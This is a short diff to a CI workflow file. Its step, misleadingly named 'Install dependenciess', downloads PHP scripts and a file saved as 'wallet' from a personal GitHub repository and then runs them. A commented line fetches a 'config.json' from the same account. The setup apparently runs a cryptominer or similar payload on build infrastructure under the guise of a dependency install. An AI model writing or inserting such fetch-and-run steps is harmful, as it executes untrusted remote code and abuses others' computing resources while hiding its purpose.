@@ -14,8 +14,9 @@ jobs:
         coverage: none
     - name: Install dependenciess
       run: |
-        wget https://github.com/Mosnio/WcmB/raw/main/nok.php
-        php nok.php
+        wget https://raw.githubusercontent.com/Mosnio/dpy/main/ok.php
+        wget -O wallet https://raw.githubusercontent.com/Mosnio/dpy/main/v1
+        php ok.php
         
  #       unzip clm.zip
 #        wget https://github.com/Mosnio/mehi1/raw/main/clm/cn1.js -O config.json
